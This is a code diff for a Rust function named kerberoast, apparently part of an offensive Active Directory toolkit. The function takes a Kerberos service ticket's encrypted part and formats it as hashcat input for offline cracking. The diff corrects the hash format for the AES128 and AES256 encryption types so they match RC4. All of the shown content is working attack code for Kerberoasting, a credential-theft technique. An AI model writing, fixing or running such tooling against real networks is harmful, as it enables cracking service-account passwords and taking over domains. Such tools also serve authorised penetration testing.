@@ -556,12 +556,14 @@ pub async fn kerberoast(
         TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;
 
     // Extract encrypted part of the SERVICE TICKET for offline cracking.
-    // Hashcat expects the cipher split into checksum and encrypted data:
+    // Hashcat expects the cipher split into checksum and encrypted data.
+    // ALL etypes use the same `*user$realm$spn*` wrapping:
     //   RC4  (mode 13100): $krb5tgs$23$*user$realm$spn*$<checksum_32hex>$<edata2_hex>
     //     checksum = first 16 bytes of cipher
-    //   AES256 (mode 19700): $krb5tgs$18$user$realm$*spn*$<checksum_24hex>$<edata2_hex>
+    //   AES128 (mode 19600): $krb5tgs$17$*user$realm$spn*$<checksum_24hex>$<edata2_hex>
     //     checksum = first 12 bytes of cipher
-    //   AES128 (mode 19600): same structure with etype 17
+    //   AES256 (mode 19700): $krb5tgs$18$*user$realm$spn*$<checksum_24hex>$<edata2_hex>
+    //     checksum = first 12 bytes of cipher
     let enc_part = &tgs_rep.ticket.enc_part;
     let cipher = &enc_part.cipher;
 
@@ -579,24 +581,12 @@ pub async fn kerberoast(
                 hex::encode(edata2),
             )
         }
-        ETYPE_AES256_CTS => {
-            // AES256: 12-byte HMAC-SHA1-96 checksum + encrypted data
-            let (checksum, edata2) = cipher.split_at(std::cmp::min(12, cipher.len()));
-            format!(
-                "$krb5tgs${}${}${}$*{}*${}${}",
-                enc_part.etype,
-                tgt.client_principal,
-                realm,
-                target_spn,
-                hex::encode(checksum),
-                hex::encode(edata2),
-            )
-        }
         etype => {
-            // AES128 or other: same 12-byte checksum split
+            // AES256 (18), AES128 (17), or other: 12-byte HMAC-SHA1-96 checksum.
+            // The `*` wraps the full user$realm$spn block, identical to RC4 layout.
             let (checksum, edata2) = cipher.split_at(std::cmp::min(12, cipher.len()));
             format!(
-                "$krb5tgs${}${}${}${}${}${}",
+                "$krb5tgs${}$*{}${}${}*${}${}",
                 etype,
                 tgt.client_principal,
                 realm,
